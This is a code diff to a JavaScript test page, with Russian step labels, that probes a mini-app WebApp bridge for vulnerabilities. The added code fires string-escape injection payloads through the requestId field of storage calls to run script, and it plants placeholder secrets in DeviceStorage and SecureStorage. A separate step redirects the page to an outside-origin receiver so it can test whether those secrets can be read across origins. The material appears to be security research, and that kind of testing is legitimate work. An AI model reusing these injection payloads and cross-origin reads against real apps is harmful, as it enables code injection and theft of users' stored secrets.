@@ -33,7 +33,7 @@ log("run:", RUN, "| platform:", window.WebApp && WebApp.platform, "| version:", 
 function wrapSendEvent(){
   if (window.WebApp && typeof WebApp.sendEvent === 'function' && !WebApp.__wrapped){
     const orig = WebApp.sendEvent.bind(WebApp);
-    WebApp.sendEvent = function(name, data){ log("<=", name, data); return orig(name, data); };
+    WebApp.sendEvent = function(name, data){ try{ log("<=", name, data, "|b64:", btoa(String(data))); }catch(e){ log("<=", name, data); } return orig(name, data); };
     WebApp.__wrapped = true; return true;
   } return false;
 }
@@ -92,6 +92,30 @@ const b4=document.createElement('button');
 b4.innerHTML='<span class="step">ШАГ 4 — редирект на чужой origin (K3) — ДЕЛАЙ ПОСЛЕДНИМ</span><br>страница уйдёт на жёлтый приёмник: там нажми A и B — если мост жив, увидишь ответы "<=" внутри приёмника';
 b4.onclick=()=>{ log("=> K3 redirect"); setTimeout(function(){ location.href='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml'; },400); };
 box.appendChild(b4);
+
+
+// round 6: K1c backslash-матрица, S5 секрет для кросс-origin чтения
+(function(){
+  const b=document.createElement('button');
+  b.innerHTML='<span class="step">ШАГ 5a — backslash-матрица (K1c)</span>';
+  b.onclick=()=>{
+    raw("WebAppDeviceStorageGetKey",{requestId:'A\\', key:'k'+RUN});
+    raw("WebAppDeviceStorageGetKey",{requestId:"\\';window.__k1g=1;//", key:'k'+RUN});
+    raw("WebAppDeviceStorageGetKey",{requestId:'x\\"-window.__k1h=1-\"', key:'k'+RUN});
+    setTimeout(()=>log("K1c result: __k1g=", window.__k1g, " __k1h=", window.__k1h), 3000);
+  };
+  box.appendChild(b);
+
+  const s=document.createElement('button');
+  s.innerHTML='<span class="step">ШАГ 5b — записать секрет (S5)</span><br>сначала эта кнопка, потом B в жёлтом фрейме';
+  s.onclick=()=>{
+    try{
+      WebApp.DeviceStorage.setItem('probe-secret-shared','SECRET-SHARED-VALUE').then(()=>log('S5: device stored')).catch(e=>log('S5 dev err',e));
+      WebApp.SecureStorage.setItem('probe-secret-sec','SECRET-SEC-VALUE').then(()=>log('S5: secure stored')).catch(e=>log('S5 sec err',e));
+    }catch(e){log('S5 throw',e.message);}
+  };
+  box.appendChild(s);
+})();
 
 document.getElementById('meta').innerHTML="run: <b>"+RUN+"</b> — скопируй лог (внизу) после шагов 1-3, потом делай шаг 4";
 })();
